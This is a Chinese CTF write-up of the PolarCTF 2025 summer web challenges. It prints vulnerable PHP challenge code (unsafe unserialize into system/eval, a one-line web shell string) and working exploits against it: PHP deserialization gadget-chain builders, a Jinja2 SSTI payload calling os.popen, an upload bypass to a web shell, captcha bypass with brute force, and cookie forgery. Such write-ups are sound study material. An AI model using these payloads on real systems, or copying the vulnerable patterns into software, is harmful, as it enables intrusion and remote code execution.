# polarctf2025夏季赛web-先知社区

> **来源**: https://xz.aliyun.com/news/18246  
> **文章ID**: 18246

---

### **简单的链子**

进入题目看到一段代码：

<?php

class A {

public $cmd;

function \_\_destruct() {

if (isset($this->cmd)) {

system($this->cmd);

}

}

}

​

if (isset($\_GET['data'])) {

$data = $\_GET['data'];

@unserialize($data);

} else {

highlight\_file(\_\_FILE\_\_);

}

一看是简单的反序列化，下面直接给出脚本：

<?php

class A {

public $cmd = 'cat /f\*';

}

$obj = new A();

echo urlencode(serialize($obj));

?>

![image.png](images/img_18246_000.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps23.jpg)

直接得到flag

​

### **渗透之王**

![image.png](images/img_18246_002.png)

开局一个登录界面，先扫描拿信息

![image.png](images/img_18246_003.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps25.jpg)

得到两个文件，第一个访问后是：

![image.png](images/img_18246_005.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps26.jpg)

解密后是：polarctf

然后第二个是下载一个压缩包，打开压缩包要密码，显然密码就是刚刚解码的内容：polarctf

打开发现是一个密码本：

![image.png](images/img_18246_007.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps27.jpg)

看来是要用这个密码本来爆破密码(账号在尝试的时候可以知道是admin)

![image.png](images/img_18246_009.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps28.jpg)

密码出来了：admin789，登陆进去可以看到下一关的提示：

​

![image.png](images/img_18246_011.png)

先文件包含一下hint.php看看有什么

![image.png](images/img_18246_012.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps30.jpg)

看来是文件上传，那么试试访问upload.php

![image.png](images/img_18246_014.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps31.jpg)

接下来开始我们的文件上传

![image.png](images/img_18246_016.png)

显然要绕过：

![image.png](images/img_18246_017.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps33.jpg)

看来是简单的MIME类型验证绕过(原理：服务器检查HTTP请求的`Content-Type`（如`image/jpeg`）或使用`fileinfo`检测真实MIME类型)

接下来蚁剑连接去找flag

![image.png](images/img_18246_019.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps34.jpg)

### **真假****ECR**

![image.png](images/img_18246_021.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps35.jpg)

经典Rce，可以看到过滤了很多，开始绕过：

![image.png](images/img_18246_023.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps36.jpg)

知道flag在根目录，直接抓:

![image.png](images/img_18246_025.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps37.jpg)

当然，这不是预期解，接下来是预期解：

扫描到flag.php文件

![image.png](images/img_18246_027.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps38.jpg)

Key解码是heigouzi，题目里暗示访问heigouzi.php（--\_--）

![image.png](images/img_18246_029.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps39.jpg)

这个参数就是cmd

![image.png](images/img_18246_031.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps40.jpg)

访问其他的命令就会显示

![image.png](images/img_18246_033.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps41.jpg)

事已至此，先访问其他的吧（-\_-）

![image.png](images/img_18246_035.png)![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps42.jpg)

这串代码就把前面的data和key联系起来了，由此可见这里是突破口

接下来上脚本：

<?

class Decryption{

public function decrypt($data,$key){

$char = '';

$str= '';

$key = md5($key);

$x = 0;

$data = base64\_decode($data);

$len = strlen($data);

$l = strlen($key);

for($i=0;$i<$len;$i++){

if($x == $l){

$x = 0;

}

$char .= substr($key,$x,1);

$x++;

}

for($i = 0;$i<$len;$i++){

$str .= chr(ord($data{$i}) - ord($char{$i}));

}

echo $str;

}

}

$data='2JSklNA=';

$key='answer';

$decryption=new Decryption();

$result=$decryption->decrypt($data,$key);

echo $result;

?>

​

至于为什么key是answer我也不知道(-\_-)官方也没解释，得到结果wanan，该结果是she11.php的（蚁剑连接密码，she11.php是一个一句话木马）接下来蚁剑连接就可以得到flag了

#### ghost\_render

![](file:///C:\Users\MECHREVO\AppData\Local\Temp\ksohtml58096\wps43.jpg)

![image.png](images/img_18246_038.png)

渲染你可以想到什么呢，当然是ssti啦

上传一个md文件内容是{{7\*7}}

![image.png](images/img_18246_039.png)

直接上payload：{{cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('cat /var/secret\_flag').read()}}

​

![image.png](images/img_18246_040.png)

#### rce命令执行系统

该系统只能回显env命令，扫描目录得到flag.txt

![image.png](images/img_18246_041.png)

![image.png](images/img_18246_042.png)

根据提示访问f1ag.php

![image.png](images/img_18246_043.png)

这个时候回去一开始界面开始操作（-\_-）

![image.png](images/img_18246_044.png)

怎么样？没想到吧，哈哈哈哈。。。。。

​

#### 命运石之门

![image.png](images/img_18246_045.png)

base64解码得到提示 : 有时候，验证码是否好使不重要

扫描目录得到password.txt,这是一个密码文件

![image.png](images/img_18246_046.png)

![image.png](images/img_18246_047.png)

得到密码，根据提示： 有时候，验证码是否好使不重要

验证码使用0000就可以进入了。。。。。。。。-\_-

![image.png](images/img_18246_048.png)

一样爆破密码

![image.png](images/img_18246_049.png)

记得选图片验证码

![image.png](images/img_18246_050.png)

#### nukaka\_ser2

题目代码：

​

<?php

​

class FlagReader {

private $logfile = "/tmp/log.txt";

protected $content = "<?php system(\$\_GET['cmd']); ?>";

​

public function \_\_toString() {

​

if (file\_exists('/flag')) {

return file\_get\_contents('/flag');

} else {

return "Flag file not found!";

}

}

}

​

class DataValidator {

public static function check($input) {

$filtered = preg\_replace('/[^\w]/', '', $input);

return strlen($filtered) > 10 ? true : false;

}

​

public function \_\_invoke($data) {

return self::check($data);

}

}

​

class FakeDanger {

private $buffer;

public function \_\_construct($data) {

$this->buffer = base64\_encode($data);

}

​

public function \_\_wakeup() {

if (rand(0, 100) > 50) {

$this->buffer = str\_rot13($this->buffer);

}

}

}

​

class VulnerableClass {

public $logger;

private $debugMode = false;

​

public function \_\_destruct() {

if ($this->debugMode) {

echo $this->logger;

} else {

$this->cleanup();

}

}

​

private function cleanup() {

if ($this->logger instanceof DataValidator) {

$this->logger = null;

}

}

}

​

​

function sanitize\_input($data) {

$data = trim($data);

return htmlspecialchars($data, ENT\_QUOTES);

}

​

if(isset($\_GET['data'])) {

$raw = base64\_decode($\_GET['data']);

if (preg\_match('/^[a-zA-Z0-9\/+]+={0,2}$/', $\_GET['data'])) {

unserialize($raw);

}

} else {

highlight\_file(\_\_FILE\_\_);

}

?>

​

​

​

调用VulnerableClass的\_\_destruct方法在debugMode=true时会输出$logger对象

当$logger是FlagReader对象时，会触发其\_\_toString方法读取flag

绕过限制：

需要设置VulnerableClass的私有属性$debugMode=true

确保$logger是FlagReader对象

序列化后的数据需满足Base64正则验证

构造链子：

<?php

class FlagReader {

private $logfile = "/tmp/log.txt";

protected $content = "<?php system(\$\_GET['cmd']); ?>";

}

​

class VulnerableClass {

public $logger;

private $debugMode = false;

}

$flag = new FlagReader();

$vuln = new VulnerableClass();

$ref = new ReflectionClass($vuln);

$debugMode = $ref->getProperty('debugMode');

$debugMode->setAccessible(true);

$debugMode->setValue($vuln, true);

$vuln->logger = $flag;

$payload = serialize($vuln);

$base64\_payload = base64\_encode($payload);

if (preg\_match('/^[a-zA-Z0-9\/+]+={0,2}$/', $base64\_payload)) {

echo "Payload符合正则验证";

} else {

echo "Payload不符合要求，请重新生成";

}

​

#### 你也玩铲吗

![image.png](images/img_18246_051.png)

注册一个账号并登录

![image.png](images/img_18246_052.png)

得到提示，猜测应该是cookie伪造，扫描目录得到

![image.png](images/img_18246_053.png)

访问login\_admin.html

![image.png](images/img_18246_054.png)

根据之前的提示把user:admin进行base64加密，赋值给auth，再访问admin\_login.php从而伪造cookie触发flag

![image.png](images/img_18246_055.png)

#### easyRead

<?php

​

Class Read{

public $source;

public $is;

​

public function \_\_toString() {

return $this->is->run("Read");

}

​

public function \_\_wakeup(){

echo "Hello>>>".$this->source;

}

​

}

class Help{

public $source;

public $str;

public function Printf($what){

echo "Hello>>>".$what;

echo "<br>";

return $this->str->source;

}

​

public function \_\_call($name, $arguments){

$this->Printf($name);

}

}

class Polar {

private $var;

public function getit($value){

​

eval($value);

}

public function \_\_invoke(){

$this->getit($this->var);

}

}

​

class Doit{

public $is;

private $source;

public function \_\_construct(){

$this->is = array();

}

​

public function \_\_get($key){

$vul = $this->is;

return $vul();

}

}

​

if(isset($\_GET['polar'])){

@unserialize($\_GET['polar']);

}

else{

highlight\_file(\_\_FILE\_\_);

}

​

反序列化触发 Read::\_\_wakeup()

输出 $source（另一个Read对象）触发 Read::\_\_toString()

\_\_toString() 调用 $is->run()（实际为Help对象）触发 Help::\_\_call()

\_\_call() 调用 Printf() 访问 $str->source（Doit对象）触发 Doit::\_\_get()

\_\_get() 执行 $is()（Polar对象）触发 Polar::\_\_invoke()

\_\_invoke() 调用 getit() 执行 eval($this->var)

​

exp：

<?php

// 定义题目中的类

class Read {

public $source;

public $is;

}

​

class Help {

public $source;

public $str;

}

​

class Polar {

private $var;

public function getit($value){} // 实际利用时执行eval

public function \_\_invoke(){}

}

​

class Doit {

public $is;

private $source;

public function \_\_construct(){}

}

​

// 构造利用链

$polar = new Polar();

// 设置Polar的私有属性$var为要执行的命令（使用反射）

$reflection = new ReflectionClass($polar);

$property = $reflection->getProperty('var');

$property->setAccessible(true);

$property->setValue($polar, "system('env');"); // 修改此处执行任意命令

​

$doit = new Doit();

$doit->is = $polar; // 触发Doit::\_\_get()时会调用Polar对象

​

$help = new Help();

$help->str = $doit; // 在Help::Printf()中访问$str->source

​

$read2 = new Read();

$read2->is = $help; // 触发Read::\_\_toString()时调用Help对象

​

$read1 = new Read();

$read1->source = $read2; // 触发Read::\_\_wakeup()时输出对象

​

// 生成payload

$payload = serialize($read1);

echo "Raw payload: \
" . $payload . "\
\
";

echo "URL encoded: \
" . urlencode($payload) . "\
";

?>

​

flag：

![image.png](images/img_18246_056.png)

比赛后被改成这玩意了，所以现在交的是flag{Hello>>>Hello>>>run}

-\_-

​

参考：

反序列化题目参考：

<https://blog.csdn.net/2301_80975944/article/details/148501492>

​
